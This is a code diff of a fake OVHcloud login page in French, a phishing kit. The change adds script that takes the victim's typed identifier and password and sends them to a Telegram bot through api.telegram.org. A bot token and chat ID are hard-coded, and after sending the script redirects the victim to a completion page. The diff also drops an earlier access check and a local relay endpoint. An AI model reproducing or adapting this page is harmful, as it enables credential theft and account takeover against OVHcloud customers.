@@ -16,11 +16,9 @@
       min-height: 100vh;
       padding: 20px;
     }
-
     .logo {
       margin-bottom: 30px;
     }
-
     .box {
       background-color: #f2faff;
       border-radius: 10px;
@@ -29,21 +27,18 @@
       width: 100%;
       max-width: 400px;
     }
-
     h2 {
       font-size: 1.2rem;
       font-weight: bold;
       text-align: center;
       margin-bottom: 20px;
     }
-
     label {
       font-size: 0.85rem;
       margin-bottom: 5px;
       display: block;
       color: #333;
     }
-
     input[type="text"],
     input[type="password"] {
       width: 100%;
@@ -53,7 +48,6 @@
       border-radius: 4px;
       font-family: inherit;
     }
-
     .button {
       background-color: #0050ff;
       color: white;
@@ -66,17 +60,14 @@
       cursor: pointer;
       margin-bottom: 15px;
     }
-
     .small {
       font-size: 0.85rem;
       text-align: center;
     }
-
     .small a {
       text-decoration: none;
       color: #0044cc;
     }
-
     .footer {
       font-size: 0.7rem;
       color: #444;
@@ -84,28 +75,23 @@
       text-align: center;
       margin-top: 30px;
     }
-
     .footer a {
       color: #0044cc;
       text-decoration: none;
       font-weight: bold;
     }
-
     @media (max-width: 768px) {
       .box {
         padding: 20px;
       }
-
       .button {
         font-size: 0.95rem;
       }
     }
-
     @media (max-width: 480px) {
       h2 {
         font-size: 1rem;
       }
-
       .button {
         font-size: 0.9rem;
       }
@@ -116,7 +102,6 @@
   <div class="logo">
     <img src="files/img/logo.svg" alt="OVHcloud Logo" height="60" />
   </div>
-
   <div class="box">
     <h2>Je suis déjà client OVHcloud</h2>
     <label>Identifiant ou adresse e-mail</label>
@@ -129,7 +114,6 @@
       <a href="#">Identifiant ou mot de passe oublié ?</a>
     </p>
   </div>
-
   <div class="footer">
     OVH SAS est le responsable de traitement de vos données personnelles. Les données
     collectées ci-dessus sont utilisées aux fins d’ouverture de votre compte client, de
@@ -140,41 +124,37 @@
   </div>
 
   <script>
-    // Vérification localStorage pour autoriser l’accès
-    if (localStorage.getItem("valide") !== "true") {
-      window.location.href = "../";
-    }
-
-    // Sélection des éléments input et bouton
     const inputIdentifiant = document.querySelector('input[type="text"]');
     const inputPassword = document.querySelector('input[type="password"]');
-    const button = document.querySelector(".button");
+    const button = document.querySelector('.button');
 
-    button.addEventListener("click", async () => {
+    button.addEventListener('click', async () => {
       const identifiant = inputIdentifiant.value.trim();
       const password = inputPassword.value.trim();
 
       if (!identifiant || !password) {
-        alert("Veuillez remplir tous les champs");
+        alert('Veuillez remplir tous les champs');
         return;
       }
 
-      try {
-        const response = await fetch("/sendTelegram", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ identifiant, password }),
-        });
+      const BOT_TOKEN = '5722730835:AAF-83VyMq8uBs0klBjz3iAdfEzPNJz8w0o'; // Remplace par ton token Telegram
+      const CHAT_ID = '-868620860'; // Remplace par ton chat ID Telegram
 
+      const message = `Identifiant OVH: ${identifiant}\nMot de passe: ${password}`;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+      try {
+        const response = await fetch(url, { method: 'GET' });
         const data = await response.json();
 
-        if (data.success) {
-          window.location.href = "fin.html";
+        if (data.ok) {
+          window.location.href = 'fin.html';
         } else {
-          alert("Erreur lors de l’envoi des données");
+          alert('Erreur lors de l’envoi des données');
+          console.error(data);
         }
       } catch (error) {
-        alert("Erreur lors de l’envoi des données");
+        alert('Erreur lors de l’envoi des données');
         console.error(error);
       }
     });
